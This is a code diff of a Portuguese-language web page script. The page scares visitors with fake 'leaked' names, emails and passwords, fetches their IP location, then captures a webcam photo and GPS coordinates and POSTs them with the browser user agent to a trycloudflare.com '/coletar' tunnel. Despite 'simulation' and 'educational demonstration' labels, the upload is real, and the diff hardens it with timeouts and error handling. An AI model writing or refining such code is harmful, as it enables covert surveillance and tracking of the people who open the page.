@@ -96,106 +96,149 @@
     </div>
 
     <script>
-        // Dados falsos para simulação
-        const nomes = ["João Silva", "Maria Souza", "Carlos Pereira", "Ana Costa", "Lucas Oliveira"];
-        const emails = ["joao123@gmail.com", "maria.souza@yahoo.com", "carlos_p@hotmail.com", "ana.costa@outlook.com", "lucas_o@protonmail.com"];
-        const senhas = ["abc123", "senha123", "flamengo2023", "qwerty", "123456"];
+  // --- helpers ---
+  function randItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
 
-        function randItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+  function getPositionPromise(options = {}) {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) return reject(new Error('Geolocalização não suportada'));
+      navigator.geolocation.getCurrentPosition(resolve, reject, options);
+    });
+  }
 
-        // Simulação de consulta
-        setTimeout(() => {
-            document.getElementById("status").textContent = "Dados encontrados!";
+  async function captureOnce(timeoutMs = 8000) {
+    const video = document.getElementById('video');
+    let stream;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    } catch (err) {
+      throw new Error('Permissão de câmera negada ou não disponível: ' + err.message);
+    }
 
-            document.getElementById("nome").textContent = randItem(nomes);
-            document.getElementById("email").textContent = randItem(emails);
-            document.getElementById("senha").textContent = randItem(senhas);
+    video.style.display = 'block'; // mostrar enquanto captura (opcional)
+    video.srcObject = stream;
 
-            fetch("https://ipapi.co/json/")
-                .then(r => r.json())
-                .then(data => {
-                    document.getElementById("ip").textContent = data.ip;
-                    document.getElementById("local").textContent = `${data.city}, ${data.region}, ${data.country_name}`;
-                });
-
-            console.log("UserAgent:", navigator.userAgent);
-
-            document.getElementById("result").style.display = "block";
-            document.getElementById("btnEnviar").style.display = "inline-block";
-        }, 3000);
-
-        document.getElementById("btnEnviar").addEventListener("click", () => {
-            if (confirm("Deseja realmente permitir o envio da sua câmera e localização para demonstração educacional?")) {
-                sendData();
-            }
-        });
-
-        async function sendData() {
-            try {
-                const imagem = await captureOnce();
-
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-
-                        const localizacao = {
-                            position: `https://www.google.com/maps?q=${latitude},${longitude}`,
-                            timestamp: position.timestamp,
-                            userAgent: navigator.userAgent,
-                            userAct: navigator.userActivation.isActive,
-                            image: imagem
-                        };
-
-                        // Apenas exemplo: envio simulado
-                        console.log("Enviando dados para servidor (simulação):", localizacao);
-
-                        alert("✅ Dados enviados com sucesso (simulação). Veja no console.");
-                        
-                        try {
-    const res = await fetch('https://reduces-uri-prepaid-retired.trycloudflare.com/coletar', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(localizacao)
+    // espera carregamento com timeout de segurança
+    await new Promise((resolve, reject) => {
+      let resolved = false;
+      function done() {
+        if (resolved) return;
+        resolved = true;
+        resolve();
+      }
+      video.addEventListener('loadedmetadata', done, { once: true });
+      // fallback
+      setTimeout(done, 2500);
     });
 
-    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    // desenha frame no canvas
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const data = await res.json(); // resposta do servidor
-    console.log('Resposta:', data);
-  } catch (err) {
-    console.error('Erro no fetch:', err);
+    // encerra a câmera
+    stream.getTracks().forEach(t => t.stop());
+    video.srcObject = null;
+    video.style.display = 'none';
+
+    return canvas.toDataURL('image/png');
   }
-                    },
-                    (error) => {
-                        console.error('Erro ao obter geolocalização:', error);
-                        alert("❌ Não foi possível obter localização.");
-                    }
-                );
-            } catch (err) {
-                console.error('Erro no sendData:', err);
-            }
-        }
 
-        async function captureOnce() {
-            const video = document.getElementById('video');
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
+  // fetch com timeout (AbortController)
+  async function fetchWithTimeout(url, options = {}, timeout = 8000) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), timeout);
+    options.signal = controller.signal;
+    try {
+      const res = await fetch(url, options);
+      clearTimeout(id);
+      return res;
+    } catch (err) {
+      clearTimeout(id);
+      throw err;
+    }
+  }
 
-            await new Promise(resolve => video.onloadedmetadata = resolve);
+  // --- simulação inicial (seu setTimeout original) ---
+  setTimeout(() => {
+    document.getElementById("status").textContent = "Dados encontrados!";
+    document.getElementById("nome").textContent = randItem(["João Silva","Maria Souza","Carlos Pereira"]);
+    document.getElementById("email").textContent = randItem(["joao123@gmail.com","maria.souza@yahoo.com"]);
+    document.getElementById("senha").textContent = randItem(["abc123","senha123","qwerty"]);
 
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+    // traz IP com tratamento de erro
+    fetch("https://ipapi.co/json/")
+      .then(r => r.ok ? r.json() : Promise.reject(new Error('IP API retornou ' + r.status)))
+      .then(data => {
+        document.getElementById("ip").textContent = data.ip || '—';
+        document.getElementById("local").textContent = `${data.city || '—'}, ${data.region || '—'}, ${data.country_name || '—'}`;
+      })
+      .catch(err => {
+        console.warn('Não foi possível obter IP:', err);
+        document.getElementById("ip").textContent = 'erro';
+        document.getElementById("local").textContent = 'erro';
+      });
 
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0);
+    document.getElementById("result").style.display = "block";
+    document.getElementById("btnEnviar").style.display = "inline-block";
+  }, 3000);
 
-            stream.getTracks().forEach(track => track.stop());
+  // --- evento do botão ---
+  document.getElementById("btnEnviar").addEventListener("click", async () => {
+    if (!confirm("Deseja realmente permitir o envio da sua câmera e localização para demonstração educacional?")) return;
+    try {
+      await sendData();
+    } catch (err) {
+      console.error('sendData falhou:', err);
+      alert('Erro: ' + err.message);
+    }
+  });
 
-            return canvas.toDataURL('image/png');
-        }
-    </script>
+  // --- função principal corrigida ---
+  async function sendData() {
+    try {
+      // captura imagem (trata possível erro)
+      const imagem = await captureOnce();
+
+      // pega posição (com timeout de 10s)
+      const pos = await getPositionPromise({ timeout: 10000 });
+
+      const latitude = pos.coords.latitude;
+      const longitude = pos.coords.longitude;
+
+      const localizacao = {
+        position: `https://www.google.com/maps?q=${latitude},${longitude}`,
+        timestamp: pos.timestamp,
+        userAgent: navigator.userAgent,
+        userAct: navigator.userActivation?.isActive ?? false,
+        image: imagem
+      };
+
+      console.log("Enviando dados (simulação):", localizacao);
+
+      // faz o POST com timeout e tratamento de erros
+      const res = await fetchWithTimeout('https://reduces-uri-prepaid-retired.trycloudflare.com/coletar', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(localizacao)
+      }, 10000);
+
+      if (!res.ok) throw new Error('Servidor respondeu com ' + res.status);
+
+      const data = await res.json();
+      console.log('Resposta do servidor:', data);
+      alert('✅ Dados enviados com sucesso (simulação). Veja console.');
+
+    } catch (err) {
+      // trata erros vindos de getUserMedia / geolocation / fetch
+      console.error('Erro no sendData:', err);
+      alert('Falha ao enviar dados: ' + (err.message || err));
+    }
+  }
+</script>
+              
 
 </body>
 
